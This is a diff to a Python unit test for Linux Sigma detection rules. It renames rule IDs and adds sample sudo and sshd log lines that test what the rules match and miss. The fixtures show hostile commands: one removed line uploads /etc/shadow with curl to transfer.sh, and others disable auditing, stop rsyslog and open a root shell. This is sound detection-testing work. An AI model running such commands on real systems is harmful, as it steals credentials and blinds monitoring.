@@ -31,7 +31,7 @@ CASES = [
     ),
     (
         "ssh_login_from_external.yml",
-        "sigma_linux_nonprivileged_ssh_from_external_address",
+        "sigma_external_ssh_login_outside_common_admin_names",
         "7f3a1c90-2b64-4e17-9d08-a11c0e100001",
         "medium",
         ("T1133",),
@@ -47,7 +47,7 @@ CASES = [
     ),
     (
         "sudo_or_su_shell.yml",
-        "sigma_linux_sudo_to_interactive_shell",
+        "sigma_linux_sudo_shell_or_tool_requested_as_root",
         "7f3a1c90-2b64-4e17-9d08-a11c0e100003",
         "high",
         ("T1548.003",),
@@ -55,7 +55,7 @@ CASES = [
     ),
     (
         "network_scanner.yml",
-        "sigma_linux_network_scanner_execution",
+        "sigma_linux_network_scanner_command_recorded",
         "7f3a1c90-2b64-4e17-9d08-a11c0e100005",
         "medium",
         ("T1046",),
@@ -97,17 +97,24 @@ _AUTH_LINES = [
     ("preauth-invalid", "Sep 14 10:20:00 bastion01 sshd[2121]: Connection closed by invalid user admin 203.0.113.9 port 22 [preauth]"),
     ("sudo-bash", "Sep 14 16:05:00 web01 sudo: frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/bash"),
     ("sudo-python3", "Sep 14 16:06:00 web01 sudo: frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/bin/python3 -c 'print(1)'"),
+    ("sudo-read-shell", "Sep 14 16:07:01 web01 sudo: frank : PWD=/tmp ; USER=root ; COMMAND=/usr/bin/file /bin/bash"),
+    ("sudo-read-scanner", "Sep 14 16:07:02 web01 sudo: frank : PWD=/tmp ; USER=root ; COMMAND=/usr/bin/file /usr/bin/nmap"),
+    ("sudo-quoted-stop", "Sep 14 16:07:03 web01 sudo: frank : PWD=/tmp ; USER=root ; COMMAND=/usr/bin/echo systemctl stop auditd"),
+    ("sudo-denied", "Sep 14 16:07:04 web01 sudo: frank : user NOT in sudoers ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"),
+    ("sudo-self", "Sep 14 16:07:05 web01 sudo: frank : PWD=/tmp ; USER=frank ; COMMAND=/bin/bash"),
+    ("sudo-root-self", "Sep 14 16:07:06 web01 sudo: root : PWD=/tmp ; USER=root ; COMMAND=/bin/bash"),
+    ("deploy-linklocal", "Sep 14 16:07:07 bastion01 sshd[42]: Accepted password for deploy from 169.254.1.2 port 50122 ssh2"),
     ("sudo-nginx", "Sep 14 16:07:00 web01 sudo: grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx"),
     ("sudo-sha256", "Sep 14 16:08:00 web01 sudo: frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/bin/sha256sum /etc/passwd"),
     ("su-root", "Sep 14 16:09:00 web01 su: (to root) frank on /dev/pts/1"),
     ("sudo-session", "Sep 14 16:11:00 web01 sudo: pam_unix(sudo:session): session opened for user root by frank(uid=0)"),
-    ("sudo-nmap", "Sep 14 16:15:00 web01 sudo: grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/nmap -sS 10.0.0.0/24"),
+    ("sudo-nmap", "Sep 14 16:15:00 web01 sudo: grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/nmap --version"),
     ("audit-nmap", 'Sep 14 11:00:00 web01 audit[1]: type=SYSCALL arch=c000003e syscall=59 success=yes exe="/usr/bin/nmap" AUID="frank"'),
     ("sudo-auditctl", "Sep 14 16:23:00 web01 sudo: frank : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/sbin/auditctl -e 0"),
     ("sudo-stop-rsyslog", "Sep 14 16:24:00 web01 sudo: frank : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop rsyslog"),
     ("sudo-status-auditd", "Sep 14 16:25:00 web01 sudo: frank : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl status auditd"),
     ("sudo-restart-rsyslog", "Sep 14 16:26:00 web01 sudo: frank : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl restart rsyslog"),
-    ("sudo-curl", "Sep 14 16:30:00 web01 sudo: frank : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -T /etc/shadow https://transfer.sh/shadow"),
+    ("sudo-curl", "Sep 14 16:30:00 web01 sudo: frank : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl --help transfer.sh"),
     ("note-tools", "Sep 14 16:40:00 web01 logger: ticket 441 mentions COMMAND=/bin/bash, auditctl -e 0, systemctl stop rsyslog, nmap, and transfer.sh"),
 ]
 _WEB_NMAP = (
@@ -188,13 +195,13 @@ class LinuxPackTests(unittest.TestCase):
         bash = by_id[ids["sudo-bash"]]
         self.assertIn("USER=root ", bash["message"])
         self.assertNotEqual(bash["user"], "root")
-        self.assertIn(ids["sudo-bash"], matched["sigma_linux_sudo_to_interactive_shell"])
-        self.assertNotIn(ids["sudo-nginx"], matched["sigma_linux_sudo_to_interactive_shell"])
-        self.assertNotIn(ids["su-root"], matched["sigma_linux_sudo_to_interactive_shell"])
+        self.assertIn(ids["sudo-bash"], matched["sigma_linux_sudo_shell_or_tool_requested_as_root"])
+        self.assertNotIn(ids["sudo-nginx"], matched["sigma_linux_sudo_shell_or_tool_requested_as_root"])
+        self.assertNotIn(ids["su-root"], matched["sigma_linux_sudo_shell_or_tool_requested_as_root"])
         self.assertNotIn(ids["note-tools"], matched["sigma_linux_logging_disable_command"])
         self.assertNotIn(ids["sudo-status-auditd"], matched["sigma_linux_logging_disable_command"])
         self.assertNotIn(ids["sudo-restart-rsyslog"], matched["sigma_linux_logging_disable_command"])
-        self.assertNotIn(ids["web-nmap"], matched["sigma_linux_network_scanner_execution"])
+        self.assertNotIn(ids["web-nmap"], matched["sigma_linux_network_scanner_command_recorded"])
         self.assertNotIn(ids["preauth-invalid"], matched["sigma_linux_ssh_authentication_for_invalid_user"])
         pack_ids = set().union(*matched.values())
         self.assertNotIn(ids["sudo-curl"], pack_ids)
